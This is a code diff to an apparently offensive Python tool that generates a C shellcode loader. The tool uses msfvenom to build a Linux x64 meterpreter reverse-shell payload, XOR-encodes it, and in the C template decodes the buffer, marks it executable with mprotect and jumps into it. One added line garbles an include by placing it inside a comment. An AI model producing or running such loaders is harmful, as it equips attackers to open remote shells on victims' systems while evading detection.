@@ -9,10 +9,11 @@ MSFVENOM_CMD = f"msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/rever
 def generate_c(shellcode):
 
   template = """
+  #define _GNU_SOURCE
+  #include <sys/mman.h> // for mprotect #include <stdlib.h>
   #include <stdio.h>
-  #include <stdlib.h>
+  #include <dlfcn.h>
   #include <unistd.h>
-  #include <sys/mman.h>
 
   int main (int argc, char **argv)
   {{
@@ -24,9 +25,17 @@ def generate_c(shellcode):
       for (int i=0; i<arraysize-1; i++) {{
         buf[i] = buf[i]^xor_key;
       }}
+
+      intptr_t pagesize = sysconf(_SC_PAGESIZE);
+      if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
+              pagesize, PROT_READ|PROT_EXEC))
+      {
+              perror("mprotect");
+              return -1;
+      }
       int (*ret)() = (int(*)())buf;
-        ret();
-      return 3;
+      ret();
+      return 0;
   }}
   """.format(xor_shellcode=shellcode.get_hex_c())
 
